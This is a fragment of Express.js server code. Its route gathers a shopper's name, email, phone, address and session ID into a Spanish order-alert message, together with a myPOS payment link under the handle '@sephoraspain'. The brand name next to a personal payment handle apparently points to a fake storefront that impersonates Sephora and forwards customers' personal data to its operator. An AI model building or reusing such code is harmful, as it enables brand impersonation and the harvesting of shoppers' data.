...
app.post('/api/submit-customer-info', async (req, res) => {
  ...
  const myposLink = `https://mypos.com/@sephoraspain/${amount}`;
  ...
  const message = `<b>🔔 NUEVO PEDIDO - SEPHORA ESPAÑA</b>\n\n<b>💰 Importe:</b> €${amount}\n\n<b>👤 Cliente:</b>\n${customerData.firstName} ${customerData.lastName}\n${customerData.email}\n${customerData.phone}\n${customerData.address}\n${customerData.city}, ${customerData.postalCode}\n${customerData.country}\n\n<b>🔑 Sesión:</b> ${sessionId}\n<b>💳 myPOS:</b> ${myposLink}`;
